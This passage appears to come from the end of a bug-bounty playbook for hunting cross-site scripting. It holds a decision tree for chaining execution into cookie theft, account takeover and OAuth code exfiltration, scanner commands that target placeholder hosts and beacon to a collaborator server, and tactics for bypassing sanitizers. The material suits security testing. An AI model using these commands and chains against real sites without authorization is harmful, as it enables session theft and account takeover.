- HTML/CSS injection without script execution (separate class: hunt-content-injection)

---

## 21. Quick Decision Tree

```
Reflection found?
├── In HTML body          → §2.1 + §3 modern event handlers
├── In attribute          → §2.2-2.5
├── In <script> string    → §2.6
├── In <style>            → §2.7
└── In <textarea>/<title> → §2.8

Markdown / rich-text field?           → §8 + §7 (DOMPurify bypass)
File upload accepts SVG?              → §9
Framework (React/Vue/Angular/...)?    → §11
postMessage handler reachable?        → §5
CSP present?                          → §13 first (decide if feasible)
Trusted Types?                        → §12
Hash / search / referrer flow?        → §4
Field viewed only by admin/SOC?       → §11 + §16 blind

Got execution?
├── Chain to cookie/token theft        → §17.1-17.3
├── Chain to autofill / SW persistence → §17.4-17.5
├── Chain to admin context             → §17.6
├── Chain to ATO via password change   → §17.7
└── Chain to OAuth code exfil          → §17.8

Before reporting: §18 validation gate.
```

---

## 22. Tools to actually run

```bash
# DOM XSS auto-discovery
DOM Invader   # built-in to Burp's Chromium

# Reflected XSS scanner
dalfox url https://target.com/path?param=FUZZ -b https://<your-collab>/
nuclei -t http/vulnerabilities/xss/ -u https://target.com

# Stored / blind beacon
xsshunter-express  # Docker self-host
interactsh-client -dns-only=false   # DNS+HTTP+SMTP receiver

# Polyglot fuzzer
xss-payload-list.txt  +  ffuf -w xss.txt -u 'https://target/?q=FUZZ'

# Prototype pollution
ppfuzz 2.0  -A browser  https://target/
```

---

## 23. Mantras

- Alert-only is not a bug. Prove **cookie theft, ATO, or admin context exec**.
- WAF won't budge in 30 min? Switch endpoint, don't WAF-fight.
- Stored > Reflected > DOM > Blind for severity; chain ALL toward Critical.
- The polyglot fires first. Then context detection. Then framework sinks. Then sanitizer bypass. Then chain.
- Markers are random. `XSSTEST` is a marker that pollutes baselines — use `q7hd2k9p`.
- Same-origin or it's not your XSS. SVG on a foreign CDN is not target's XSS.
- DOMPurify version is fingerprinted? CVE-2025-26791 first, then mathml/CDATA mutation, then bail.
- One Critical chain > ten Medium reflected reports. Optimize for $-per-hour.
